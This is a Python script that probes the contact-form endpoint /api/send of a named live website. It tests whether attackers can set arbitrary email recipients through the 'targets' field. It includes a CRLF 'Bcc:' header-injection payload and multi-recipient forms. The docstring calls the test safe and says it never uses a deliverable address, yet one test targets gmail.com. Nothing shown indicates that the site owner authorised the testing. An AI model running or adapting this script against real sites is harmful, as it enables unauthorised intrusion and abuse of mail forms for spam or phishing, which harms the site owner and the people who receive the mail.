#!/usr/bin/env python3
"""W19i: prove the /api/send recipient-control finding with a safe differential.

The 422 body is a Resend API validation error naming the *recipient domain*,
which proves the server hands the client-controlled `targets` to the mail
provider. Differential:
  - example.com           -> 422 "use our testing email address" (provider blocklist)
  - random nonexistent TLD-> a DIFFERENT provider error (forwarded & validated)
  - real outside domain   -> we do NOT use a deliverable address; we use a
                            .invalid/.test domain so nothing is ever delivered.
Goal: prove arbitrary-recipient capability + count how far it gets, without
sending mail to any real person.
"""
import json, time, urllib.request, urllib.error, uuid

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
BASE = "https://www.infinitycapital.bh"
LOG = open("/tmp/w19i.jsonl", "a")
TAG = "w19i-" + uuid.uuid4().hex[:8]


def post(fields, timeout=30):
    b = "----WKB" + uuid.uuid4().hex[:16]
    parts = []
    for k, v in fields.items():
        parts.append(f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n")
    parts.append(f"--{b}--\r\n")
    r = urllib.request.Request(BASE + "/api/send", data="".join(parts).encode(),
                               method="POST", headers={"User-Agent": UA, "Accept": "*/*"})
    r.add_header("Content-Type", f"multipart/form-data; boundary={b}")
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read(), time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, e.read(), time.time() - t0
    except Exception as e:
        return 0, str(e).encode(), time.time() - t0


def f(targets, **over):
    d = {"fname": "Test", "lname": "Tester", "areacode": "+973", "tel": "30000000",
         "cname": "Test Person", "subject": "General Inquiry", "msg": "Hello there.",
         "check": "", "targets": targets}
    d.update(over)
    return d


def t(lbl, targets, gap=5, **over):
    st, b, dt = post(f(targets, **over))
    print(f"  {lbl}\n    targets={targets!r}\n    -> {st} {dt:.2f}s\n    {b[:400].decode('utf-8','replace')}")
    LOG.write(json.dumps({"tag": TAG, "label": lbl, "targets": targets, "status": st,
                          "body": b[:2000].decode("utf-8", "replace")}) + "\n")
    LOG.flush()
    time.sleep(gap)
    return st, b


print(f"=== recipient-control differential, tag={TAG} ===\n")
print("[A] provider test-mode blocklist (control)")
t("control example.com", f"probe-{TAG}@example.com")
print("\n[B] arbitrary NON-blocklisted domains (.invalid = RFC 2606, never deliverable)")
t("random .invalid", f"probe-{TAG}@zzz-not-a-real-domain-{uuid.uuid4().hex[:6]}.invalid")
t("random .test", f"probe-{TAG}@zzz-not-real-{uuid.uuid4().hex[:6]}.test")
t("gmail external", f"probe.{TAG}.zzz@gmail.com")
print("\n[C] display-name / multiple-recipient forms (header injection surface)")
t("Name <addr>", f"Probe {TAG} <probe-{TAG}@zzz-not-real-{uuid.uuid4().hex[:6]}.invalid>")
t("two recipients", f"probe-{TAG}@zzz-not-real-{uuid.uuid4().hex[:6]}.invalid,probe2-{TAG}@zzz-not-real-{uuid.uuid4().hex[:6]}.invalid")
t("comma+space inject", f"probe-{TAG}@zzz-not-real-{uuid.uuid4().hex[:6]}.invalid\r\nBcc: probe-{TAG}@zzz-not-real-{uuid.uuid4().hex[:6]}.invalid")
print("\n[D] does the app overwrite targets server-side? send with NO targets")
t("empty targets", "")
t("targets = the app's own domain", "someone@infinitycapital.bh")
